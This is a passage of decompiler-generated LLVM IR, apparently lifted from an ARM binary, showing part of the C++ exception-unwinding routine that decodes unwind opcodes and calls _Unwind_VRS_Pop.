  br label %dec_label_pc_19380

dec_label_pc_19478:                               ; preds = %dec_label_pc_1966c
  %v7_19478 = icmp eq i32 %v0_1966c, 199
  store i1 %v7_19478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19478, label %dec_label_pc_1974c, label %dec_label_pc_19480

dec_label_pc_19480:                               ; preds = %dec_label_pc_19478
  %v1_19480 = and i32 %v0_192b0, 248
  store i32 %v1_19480, i32* %r3.global-to-local, align 4
  %v7_19484 = icmp eq i32 %v1_19480, 192
  store i1 %v7_19484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19484, label %.thread24, label %dec_label_pc_1949c

.thread24:                                        ; preds = %dec_label_pc_19480
  %v2_19488 = urem i32 %v0_192b0, 16
  %v2_1948c = add nuw nsw i32 %v2_19488, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19494 = or i32 %v2_1948c, 655360
  store i32 %v2_19494, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_1949c:                               ; preds = %dec_label_pc_19480
  %v7_1949c = icmp eq i32 %v0_1966c, 200
  store i1 %v7_1949c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1949c, label %dec_label_pc_196e0, label %dec_label_pc_194a4

dec_label_pc_194a4:                               ; preds = %dec_label_pc_1949c
  %v7_194a4 = icmp eq i32 %v0_1966c, 201
  store i1 %v7_194a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_194a4, label %dec_label_pc_194ac, label %dec_label_pc_19528

dec_label_pc_194ac:                               ; preds = %dec_label_pc_194a4
  %v0_194ac = load i32, i32* @r5, align 4
  %v1_194ac = add i32 %v0_194ac, 8
  %v2_194ac = inttoptr i32 %v1_194ac to i8*
  %v3_194ac = load i8, i8* %v2_194ac, align 1
  %v4_194ac = zext i8 %v3_194ac to i32
  store i32 %v4_194ac, i32* %r3.global-to-local, align 4
  %v2_194b0 = icmp eq i8 %v3_194ac, 0
  store i1 %v2_194b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194b0, label %dec_label_pc_194c0, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_194ac
  %v2_194b4 = add nsw i32 %v4_194ac, -1
  store i32 %v2_194b4, i32* %r3.global-to-local, align 4
  %v2_194b8 = trunc i32 %v2_194b4 to i8
  store i8 %v2_194b8, i8* %v2_194ac, align 1
  %v0_194bc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_194bc.pr.pr, label %.thread26.dec_label_pc_194c0_crit_edge, label %dec_label_pc_194f4

.thread26.dec_label_pc_194c0_crit_edge:           ; preds = %.thread26
  %v0_194c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194c0

dec_label_pc_194c0:                               ; preds = %.thread26.dec_label_pc_194c0_crit_edge, %dec_label_pc_194ac
  %v2_194d8 = phi i32 [ %v0_194c0.pre, %.thread26.dec_label_pc_194c0_crit_edge ], [ %v0_194ac, %dec_label_pc_194ac ]
  %v1_194c0 = add i32 %v2_194d8, 9
  %v2_194c0 = inttoptr i32 %v1_194c0 to i8*
  %v3_194c0 = load i8, i8* %v2_194c0, align 1
  %v4_194c0 = zext i8 %v3_194c0 to i32
  store i32 %v4_194c0, i32* %r3.global-to-local, align 4
  %v2_194c4 = icmp eq i8 %v3_194c0, 0
  store i1 %v2_194c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194c4, label %dec_label_pc_19510, label %dec_label_pc_194d4

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194c0
  %v1_194d4 = add nsw i32 %v4_194c0, -1
  store i32 %v1_194d4, i32* %r3.global-to-local, align 4
  %v1_194d8 = trunc i32 %v1_194d4 to i8
  store i8 %v1_194d8, i8* %v2_194c0, align 1
  %v0_194dc = load i32, i32* @r5, align 4
  %v1_194dc = add i32 %v0_194dc, 4
  %v2_194dc = inttoptr i32 %v1_194dc to i32*
  %v3_194dc = load i32, i32* %v2_194dc, align 4
  store i32 %v3_194dc, i32* %r2.global-to-local, align 4
  %v1_194e0 = inttoptr i32 %v3_194dc to i32*
  %v2_194e0 = load i32, i32* %v1_194e0, align 4
  store i32 %v2_194e0, i32* %r0.global-to-local, align 4
  %v4_194e0 = add i32 %v3_194dc, 4
  store i32 %v4_194e0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_194e0, i32* %v2_194dc, align 4
  %v0_194ec = load i32, i32* %r3.global-to-local, align 4
  %v1_194ec = trunc i32 %v0_194ec to i8
  %v2_194ec = load i32, i32* @r5, align 4
  %v3_194ec = add i32 %v2_194ec, 8
  %v4_194ec = inttoptr i32 %v3_194ec to i8*
  store i8 %v1_194ec, i8* %v4_194ec, align 1
  %v0_194f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_194f0 = load i32, i32* @r5, align 4
  %v2_194f0 = inttoptr i32 %v1_194f0 to i32*
  store i32 %v0_194f0, i32* %v2_194f0, align 4
  br label %dec_label_pc_194f4

dec_label_pc_194f4:                               ; preds = %.thread26, %dec_label_pc_194d4
  %v0_194f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_194f4 = udiv i32 %v0_194f4, 16777216
  %v1_194f8 = urem i32 %v3_194f4, 16
  %v3_194fc = mul i32 %v0_194f4, 256
  %v1_19500 = add nuw nsw i32 %v1_194f8, 1
  store i32 %v1_19500, i32* %r1.global-to-local, align 4
  %v1_19504 = and i32 %v3_194f4, 240
  store i32 %v1_19504, i32* %r3.global-to-local, align 4
  %v1_19508 = load i32, i32* @r5, align 4
  %v2_19508 = inttoptr i32 %v1_19508 to i32*
  store i32 %v3_194fc, i32* %v2_19508, align 4
  %v0_1950c = load i32, i32* %r1.global-to-local, align 4
  %v1_1950c = load i32, i32* %r3.global-to-local, align 4
  %v4_1950c = mul i32 %v1_1950c, 4096
  %v5_1950c = or i32 %v4_1950c, %v0_1950c
  br label %dec_label_pc_19510

dec_label_pc_19510:                               ; preds = %dec_label_pc_194c0, %dec_label_pc_194f4
  %storemerge = phi i32 [ %v5_1950c, %dec_label_pc_194f4 ], [ 720897, %dec_label_pc_194c0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_19510 = load i32, i32* @r7, align 4
  store i32 %v0_19510, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1951c = call i32 @_Unwind_VRS_Pop(i32 %v0_19510, i32 1, i32 5, i32 5)
  store i32 %v4_1951c, i32* %r0.global-to-local, align 4
  %v2_19520 = icmp eq i32 %v4_1951c, 0
  store i1 %v2_19520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19520, label %dec_label_pc_19258.backedge, label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_19774, %dec_label_pc_194a4, %dec_label_pc_19584, %dec_label_pc_19928, %dec_label_pc_198f8, %dec_label_pc_198d4, %dec_label_pc_19760, %dec_label_pc_19510, %dec_label_pc_19324, %dec_label_pc_19318, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_19530:                               ; preds = %dec_label_pc_193e8
  %v7_19530 = icmp eq i32 %v1_192b8, 160
  store i1 %v7_19530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19530, label %dec_label_pc_19538, label %dec_label_pc_19574

dec_label_pc_19538:                               ; preds = %dec_label_pc_19530
  %v0_19538 = load i32, i32* %ip.global-to-local, align 4
  %v1_19538 = urem i32 %v0_19538, 8
  %v1_1953c = xor i32 %v1_19538, 7
  store i32 %v1_1953c, i32* %r3.global-to-local, align 4
  %v6_19544 = lshr i32 4080, %v1_1953c
  %v1_19548 = and i32 %v0_192b0, 8
  %v2_19548 = icmp eq i32 %v1_19548, 0
  store i1 %v2_19548, i1* %cpsr_z.global-to-local, align 1
  %v1_1954c = and i32 %v6_19544, 4080
  %tmp155 = mul nuw nsw i32 %v1_19548, 2048
  %tmp156 = or i32 %v1_1954c, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_19558:                               ; preds = %.thread44, %.thread24, %dec_label_pc_198e8.dec_label_pc_19558_crit_edge, %bb157, %dec_label_pc_19744, %dec_label_pc_196d8, %dec_label_pc_19638, %dec_label_pc_19538
  %v2_19560 = phi i32 [ %v2_1965c, %.thread44 ], [ %v2_19664, %bb157 ], [ %v2_19560.pre, %dec_label_pc_198e8.dec_label_pc_19558_crit_edge ], [ %v2_19494, %.thread24 ], [ %storemerge130, %dec_label_pc_19744 ], [ %storemerge131, %dec_label_pc_196d8 ], [ %storemerge132, %dec_label_pc_19638 ], [ %tmp156, %dec_label_pc_19538 ]
  %v0_1955c = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_198e8.dec_label_pc_19558_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_19744 ], [ 3, %dec_label_pc_196d8 ], [ 1, %dec_label_pc_19638 ], [ 0, %dec_label_pc_19538 ]
  %v0_19558 = load i32, i32* @r7, align 4
  store i32 %v0_19558, i32* %r0.global-to-local, align 4
  store i32 %v0_1955c, i32* %r3.global-to-local, align 4
  %v4_19560 = call i32 @_Unwind_VRS_Pop(i32 %v0_19558, i32 %v0_1955c, i32 %v2_19560, i32 %v0_1955c)
  store i32 %v4_19560, i32* %r0.global-to-local, align 4
  %v2_19564 = icmp eq i32 %v4_19560, 0
  store i1 %v2_19564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19564, label %dec_label_pc_19258.backedge, label %dec_label_pc_1956c

dec_label_pc_1956c:                               ; preds = %dec_label_pc_19558
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_19574:                               ; preds = %dec_label_pc_19530
  %v7_19574 = icmp eq i32 %v1_192b8, 176
  store i1 %v7_19574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19574, label %dec_label_pc_195bc, label %dec_label_pc_1957c

dec_label_pc_1957c:                               ; preds = %dec_label_pc_19574
  %v7_1957c = icmp eq i32 %v1_192b8, 192
  store i1 %v7_1957c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1957c, label %dec_label_pc_1966c, label %dec_label_pc_19584

dec_label_pc_19584:                               ; preds = %dec_label_pc_1957c
  %v1_19584 = and i32 %v0_192b0, 248
  store i32 %v1_19584, i32* %r3.global-to-local, align 4
  %v7_19588 = icmp eq i32 %v1_19584, 208
  store i1 %v7_19588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19588, label %dec_label_pc_19590, label %dec_label_pc_19528

dec_label_pc_19590:                               ; preds = %dec_label_pc_19584
  %v1_19590 = urem i32 %v0_192b0, 8
  %v1_19594 = add nuw nsw i32 %v1_19590, 1
  %v1_19598 = or i32 %v1_19594, 524288
  store i32 %v1_19598, i32* %r2.global-to-local, align 4
  %v0_1959c = load i32, i32* @r7, align 4
  store i32 %v0_1959c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_195a8 = call i32 @_Unwind_VRS_Pop(i32 %v0_1959c, i32 1, i32 %v1_19598, i32 5)
  store i32 %v4_195a8, i32* %r0.global-to-local, align 4
  %v2_195ac = icmp eq i32 %v4_195a8, 0
  store i1 %v2_195ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195ac, label %dec_label_pc_19258.backedge, label %dec_label_pc_195b4

dec_label_pc_195b4:                               ; preds = %dec_label_pc_19590
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_195bc:                               ; preds = %dec_label_pc_19574
  %v0_195bc = load i32, i32* %ip.global-to-local, align 4
  %v7_195bc = icmp eq i32 %v0_195bc, 177
  store i1 %v7_195bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195bc, label %dec_label_pc_198c0, label %dec_label_pc_195c4

dec_label_pc_195c4:                               ; preds = %dec_label_pc_195bc
  %v7_195c4 = icmp eq i32 %v0_195bc, 178
  store i1 %v7_195c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195c4, label %dec_label_pc_19798, label %dec_label_pc_195cc

dec_label_pc_195cc:                               ; preds = %dec_label_pc_195c4
  %v7_195cc = icmp eq i32 %v0_195bc, 179
  store i1 %v7_195cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195cc, label %dec_label_pc_195d4, label %dec_label_pc_19640

dec_label_pc_195d4:                               ; preds = %dec_label_pc_195cc
  %v0_195d4 = load i32, i32* @r5, align 4
  %v1_195d4 = add i32 %v0_195d4, 8
  %v2_195d4 = inttoptr i32 %v1_195d4 to i8*
  %v3_195d4 = load i8, i8* %v2_195d4, align 1
  %v4_195d4 = zext i8 %v3_195d4 to i32
  store i32 %v4_195d4, i32* %r3.global-to-local, align 4
  %v2_195d8 = icmp eq i8 %v3_195d4, 0
  store i1 %v2_195d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195d8, label %dec_label_pc_195e8, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_195d4
  %v2_195dc = add nsw i32 %v4_195d4, -1
  store i32 %v2_195dc, i32* %r3.global-to-local, align 4
  %v2_195e0 = trunc i32 %v2_195dc to i8
  store i8 %v2_195e0, i8* %v2_195d4, align 1
  %v0_195e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_195e4.pr.pr, label %.thread30.dec_label_pc_195e8_crit_edge, label %dec_label_pc_1961c

.thread30.dec_label_pc_195e8_crit_edge:           ; preds = %.thread30
  %v0_195e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195e8

dec_label_pc_195e8:                               ; preds = %.thread30.dec_label_pc_195e8_crit_edge, %dec_label_pc_195d4
  %v2_19600 = phi i32 [ %v0_195e8.pre, %.thread30.dec_label_pc_195e8_crit_edge ], [ %v0_195d4, %dec_label_pc_195d4 ]
  %v1_195e8 = add i32 %v2_19600, 9
  %v2_195e8 = inttoptr i32 %v1_195e8 to i8*
  %v3_195e8 = load i8, i8* %v2_195e8, align 1
  %v4_195e8 = zext i8 %v3_195e8 to i32
  store i32 %v4_195e8, i32* %r3.global-to-local, align 4
  %v2_195ec = icmp eq i8 %v3_195e8, 0
  store i1 %v2_195ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195ec, label %dec_label_pc_19638, label %dec_label_pc_195fc

dec_label_pc_195fc:                               ; preds = %dec_label_pc_195e8
  %v1_195fc = add nsw i32 %v4_195e8, -1
  store i32 %v1_195fc, i32* %r3.global-to-local, align 4
  %v1_19600 = trunc i32 %v1_195fc to i8
  store i8 %v1_19600, i8* %v2_195e8, align 1
  %v0_19604 = load i32, i32* @r5, align 4
  %v1_19604 = add i32 %v0_19604, 4
  %v2_19604 = inttoptr i32 %v1_19604 to i32*
  %v3_19604 = load i32, i32* %v2_19604, align 4
  store i32 %v3_19604, i32* %r2.global-to-local, align 4
  %v1_19608 = inttoptr i32 %v3_19604 to i32*
  %v2_19608 = load i32, i32* %v1_19608, align 4
  store i32 %v2_19608, i32* %r0.global-to-local, align 4
  %v4_19608 = add i32 %v3_19604, 4
  store i32 %v4_19608, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19608, i32* %v2_19604, align 4
  %v0_19614 = load i32, i32* %r3.global-to-local, align 4
  %v1_19614 = trunc i32 %v0_19614 to i8
  %v2_19614 = load i32, i32* @r5, align 4
  %v3_19614 = add i32 %v2_19614, 8
  %v4_19614 = inttoptr i32 %v3_19614 to i8*
  store i8 %v1_19614, i8* %v4_19614, align 1
  %v0_19618 = load i32, i32* %r0.global-to-local, align 4
  %v1_19618 = load i32, i32* @r5, align 4
  %v2_19618 = inttoptr i32 %v1_19618 to i32*
  store i32 %v0_19618, i32* %v2_19618, align 4
  br label %dec_label_pc_1961c

dec_label_pc_1961c:                               ; preds = %.thread30, %dec_label_pc_195fc
  %v0_1961c = load i32, i32* %r0.global-to-local, align 4
  %v3_1961c = udiv i32 %v0_1961c, 16777216
  %v1_19620 = urem i32 %v3_1961c, 16
  %v3_19624 = mul i32 %v0_1961c, 256
  store i32 %v3_19624, i32* %r0.global-to-local, align 4
  %v1_19628 = add nuw nsw i32 %v1_19620, 1
  store i32 %v1_19628, i32* %r2.global-to-local, align 4
  %v1_1962c = and i32 %v3_1961c, 240
  store i32 %v1_1962c, i32* %r3.global-to-local, align 4
  %v1_19630 = load i32, i32* @r5, align 4
  %v2_19630 = inttoptr i32 %v1_19630 to i32*
  store i32 %v3_19624, i32* %v2_19630, align 4
  %v0_19634 = load i32, i32* %r2.global-to-local, align 4
  %v1_19634 = load i32, i32* %r3.global-to-local, align 4
  %v4_19634 = mul i32 %v1_19634, 4096
  %v5_19634 = or i32 %v4_19634, %v0_19634
  br label %dec_label_pc_19638

dec_label_pc_19638:                               ; preds = %dec_label_pc_195e8, %dec_label_pc_1961c
  %storemerge132 = phi i32 [ %v5_19634, %dec_label_pc_1961c ], [ 720897, %dec_label_pc_195e8 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_19640:                               ; preds = %dec_label_pc_195cc
  %v1_19640 = and i32 %v0_192b0, 252
  store i32 %v1_19640, i32* %r3.global-to-local, align 4
  %v7_19644 = icmp eq i32 %v1_19640, 180
  store i1 %v7_19644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19644, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_19640
  %v2_19648 = urem i32 %v0_192b0, 4
  %v2_19650 = add nuw nsw i32 %v2_19648, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1965c = or i32 %v2_19650, 262144
  store i32 %v2_1965c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19558

bb157:                                            ; preds = %dec_label_pc_19640
  %v2_1964c = urem i32 %v0_195bc, 8
  %v2_19654 = add nuw nsw i32 %v2_1964c, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19664 = or i32 %v2_19654, 524288
  store i32 %v2_19664, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_1966c:                               ; preds = %dec_label_pc_1957c
  %v0_1966c = load i32, i32* %ip.global-to-local, align 4
  %v7_1966c = icmp eq i32 %v0_1966c, 198
  store i1 %v7_1966c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1966c, label %dec_label_pc_19674, label %dec_label_pc_19478

dec_label_pc_19674:                               ; preds = %dec_label_pc_1966c
  %v0_19674 = load i32, i32* @r5, align 4
  %v1_19674 = add i32 %v0_19674, 8
  %v2_19674 = inttoptr i32 %v1_19674 to i8*
  %v3_19674 = load i8, i8* %v2_19674, align 1
  %v4_19674 = zext i8 %v3_19674 to i32
  store i32 %v4_19674, i32* %r3.global-to-local, align 4
  %v2_19678 = icmp eq i8 %v3_19674, 0
  store i1 %v2_19678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19678, label %dec_label_pc_19688, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19674
  %v2_1967c = add nsw i32 %v4_19674, -1
  store i32 %v2_1967c, i32* %r3.global-to-local, align 4
  %v2_19680 = trunc i32 %v2_1967c to i8
  store i8 %v2_19680, i8* %v2_19674, align 1
  %v0_19684.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19684.pr.pr, label %.thread48.dec_label_pc_19688_crit_edge, label %dec_label_pc_196bc

.thread48.dec_label_pc_19688_crit_edge:           ; preds = %.thread48
  %v0_19688.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %.thread48.dec_label_pc_19688_crit_edge, %dec_label_pc_19674
  %v2_196a0 = phi i32 [ %v0_19688.pre, %.thread48.dec_label_pc_19688_crit_edge ], [ %v0_19674, %dec_label_pc_19674 ]
  %v1_19688 = add i32 %v2_196a0, 9
  %v2_19688 = inttoptr i32 %v1_19688 to i8*
  %v3_19688 = load i8, i8* %v2_19688, align 1
  %v4_19688 = zext i8 %v3_19688 to i32
  store i32 %v4_19688, i32* %r3.global-to-local, align 4
  %v2_1968c = icmp eq i8 %v3_19688, 0
  store i1 %v2_1968c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1968c, label %dec_label_pc_196d8, label %dec_label_pc_1969c

dec_label_pc_1969c:                               ; preds = %dec_label_pc_19688
  %v1_1969c = add nsw i32 %v4_19688, -1
  store i32 %v1_1969c, i32* %r3.global-to-local, align 4
  %v1_196a0 = trunc i32 %v1_1969c to i8
  store i8 %v1_196a0, i8* %v2_19688, align 1
  %v0_196a4 = load i32, i32* @r5, align 4
  %v1_196a4 = add i32 %v0_196a4, 4
  %v2_196a4 = inttoptr i32 %v1_196a4 to i32*
  %v3_196a4 = load i32, i32* %v2_196a4, align 4
  store i32 %v3_196a4, i32* %r2.global-to-local, align 4
  %v1_196a8 = inttoptr i32 %v3_196a4 to i32*
  %v2_196a8 = load i32, i32* %v1_196a8, align 4
  store i32 %v2_196a8, i32* %r0.global-to-local, align 4
  %v4_196a8 = add i32 %v3_196a4, 4
  store i32 %v4_196a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_196a8, i32* %v2_196a4, align 4
  %v0_196b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_196b4 = trunc i32 %v0_196b4 to i8
  %v2_196b4 = load i32, i32* @r5, align 4
  %v3_196b4 = add i32 %v2_196b4, 8
  %v4_196b4 = inttoptr i32 %v3_196b4 to i8*
  store i8 %v1_196b4, i8* %v4_196b4, align 1
  %v0_196b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_196b8 = load i32, i32* @r5, align 4
  %v2_196b8 = inttoptr i32 %v1_196b8 to i32*
  store i32 %v0_196b8, i32* %v2_196b8, align 4
  br label %dec_label_pc_196bc

dec_label_pc_196bc:                               ; preds = %.thread48, %dec_label_pc_1969c
  %v0_196bc = load i32, i32* %r0.global-to-local, align 4
  %v3_196bc = udiv i32 %v0_196bc, 16777216
  %v1_196c0 = urem i32 %v3_196bc, 16
  %v3_196c4 = mul i32 %v0_196bc, 256
  store i32 %v3_196c4, i32* %r0.global-to-local, align 4
  %v1_196c8 = add nuw nsw i32 %v1_196c0, 1
  store i32 %v1_196c8, i32* %r2.global-to-local, align 4
  %v1_196cc = and i32 %v3_196bc, 240
  store i32 %v1_196cc, i32* %r3.global-to-local, align 4
  %v1_196d0 = load i32, i32* @r5, align 4
  %v2_196d0 = inttoptr i32 %v1_196d0 to i32*
  store i32 %v3_196c4, i32* %v2_196d0, align 4
  %v0_196d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_196d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_196d4 = mul i32 %v1_196d4, 4096
  %v5_196d4 = or i32 %v4_196d4, %v0_196d4
  br label %dec_label_pc_196d8

dec_label_pc_196d8:                               ; preds = %dec_label_pc_19688, %dec_label_pc_196bc
  %storemerge131 = phi i32 [ %v5_196d4, %dec_label_pc_196bc ], [ 720897, %dec_label_pc_19688 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_196e0:                               ; preds = %dec_label_pc_1949c
  %v0_196e0 = load i32, i32* @r5, align 4
  %v1_196e0 = add i32 %v0_196e0, 8
  %v2_196e0 = inttoptr i32 %v1_196e0 to i8*
  %v3_196e0 = load i8, i8* %v2_196e0, align 1
  %v4_196e0 = zext i8 %v3_196e0 to i32
  store i32 %v4_196e0, i32* %r3.global-to-local, align 4
  %v2_196e4 = icmp eq i8 %v3_196e0, 0
  store i1 %v2_196e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196e4, label %dec_label_pc_196f4, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_196e0
  %v2_196e8 = add nsw i32 %v4_196e0, -1
  store i32 %v2_196e8, i32* %r3.global-to-local, align 4
  %v2_196ec = trunc i32 %v2_196e8 to i8
  store i8 %v2_196ec, i8* %v2_196e0, align 1
  %v0_196f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_196f0.pr.pr, label %.thread52.dec_label_pc_196f4_crit_edge, label %dec_label_pc_19728

.thread52.dec_label_pc_196f4_crit_edge:           ; preds = %.thread52
  %v0_196f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_196f4

dec_label_pc_196f4:                               ; preds = %.thread52.dec_label_pc_196f4_crit_edge, %dec_label_pc_196e0
  %v2_1970c = phi i32 [ %v0_196f4.pre, %.thread52.dec_label_pc_196f4_crit_edge ], [ %v0_196e0, %dec_label_pc_196e0 ]
  %v1_196f4 = add i32 %v2_1970c, 9
  %v2_196f4 = inttoptr i32 %v1_196f4 to i8*
  %v3_196f4 = load i8, i8* %v2_196f4, align 1
  %v4_196f4 = zext i8 %v3_196f4 to i32
  store i32 %v4_196f4, i32* %r3.global-to-local, align 4
  %v2_196f8 = icmp eq i8 %v3_196f4, 0
  store i1 %v2_196f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196f8, label %dec_label_pc_19744, label %dec_label_pc_19708

dec_label_pc_19708:                               ; preds = %dec_label_pc_196f4
  %v1_19708 = add nsw i32 %v4_196f4, -1
  store i32 %v1_19708, i32* %r3.global-to-local, align 4
  %v1_1970c = trunc i32 %v1_19708 to i8
  store i8 %v1_1970c, i8* %v2_196f4, align 1
  %v0_19710 = load i32, i32* @r5, align 4
  %v1_19710 = add i32 %v0_19710, 4
  %v2_19710 = inttoptr i32 %v1_19710 to i32*
  %v3_19710 = load i32, i32* %v2_19710, align 4
  store i32 %v3_19710, i32* %r2.global-to-local, align 4
  %v1_19714 = inttoptr i32 %v3_19710 to i32*
  %v2_19714 = load i32, i32* %v1_19714, align 4
  store i32 %v2_19714, i32* %r0.global-to-local, align 4
  %v4_19714 = add i32 %v3_19710, 4
  store i32 %v4_19714, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19714, i32* %v2_19710, align 4
  %v0_19720 = load i32, i32* %r3.global-to-local, align 4
  %v1_19720 = trunc i32 %v0_19720 to i8
  %v2_19720 = load i32, i32* @r5, align 4
  %v3_19720 = add i32 %v2_19720, 8
  %v4_19720 = inttoptr i32 %v3_19720 to i8*
  store i8 %v1_19720, i8* %v4_19720, align 1
  %v0_19724 = load i32, i32* %r0.global-to-local, align 4
  %v1_19724 = load i32, i32* @r5, align 4
  %v2_19724 = inttoptr i32 %v1_19724 to i32*
  store i32 %v0_19724, i32* %v2_19724, align 4
  br label %dec_label_pc_19728

dec_label_pc_19728:                               ; preds = %.thread52, %dec_label_pc_19708
  %v0_19728 = load i32, i32* %r0.global-to-local, align 4
  %v3_19728 = udiv i32 %v0_19728, 16777216
  %v1_1972c = urem i32 %v3_19728, 16
  %v3_19730 = mul i32 %v0_19728, 256
  store i32 %v3_19730, i32* %r0.global-to-local, align 4
  %v1_19734 = add nuw nsw i32 %v1_1972c, 1
  store i32 %v1_19734, i32* %r2.global-to-local, align 4
  %v1_19738 = and i32 %v3_19728, 240
  store i32 %v1_19738, i32* %r3.global-to-local, align 4
  %v1_1973c = load i32, i32* @r5, align 4
  %v2_1973c = inttoptr i32 %v1_1973c to i32*
  store i32 %v3_19730, i32* %v2_1973c, align 4
  %v0_19740 = load i32, i32* %r2.global-to-local, align 4
  %v1_19740 = load i32, i32* %r3.global-to-local, align 4
  %v4_19740 = mul i32 %v1_19740, 4096
  %v5_19740 = or i32 %v4_19740, %v0_19740
  br label %dec_label_pc_19744

dec_label_pc_19744:                               ; preds = %dec_label_pc_196f4, %dec_label_pc_19728
  %storemerge130 = phi i32 [ %v5_19740, %dec_label_pc_19728 ], [ 720897, %dec_label_pc_196f4 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_1974c:                               ; preds = %dec_label_pc_19478
  %v0_1974c = load i32, i32* @r5, align 4
  %v1_1974c = add i32 %v0_1974c, 8
  %v2_1974c = inttoptr i32 %v1_1974c to i8*
  %v3_1974c = load i8, i8* %v2_1974c, align 1
  %v4_1974c = zext i8 %v3_1974c to i32
  store i32 %v4_1974c, i32* %r3.global-to-local, align 4
  %v2_19750 = icmp eq i8 %v3_1974c, 0
  store i1 %v2_19750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19750, label %dec_label_pc_198f8, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1974c
  %v2_19754 = add nsw i32 %v4_1974c, -1
  store i32 %v2_19754, i32* %r3.global-to-local, align 4
  %v2_19758 = trunc i32 %v2_19754 to i8
  store i8 %v2_19758, i8* %v2_1974c, align 1
  %v0_1975c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1975c.pr.pr, label %.thread56.dec_label_pc_198f8_crit_edge, label %dec_label_pc_19760

.thread56.dec_label_pc_198f8_crit_edge:           ; preds = %.thread56
  %v0_198f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_198f8

dec_label_pc_19760:                               ; preds = %.thread56, %dec_label_pc_19904
  %v0_19760 = load i32, i32* %r0.global-to-local, align 4
  %v3_19760 = udiv i32 %v0_19760, 16777216
  store i32 %v3_19760, i32* %r3.global-to-local, align 4
  store i32 %v3_19760, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19760, 16777216
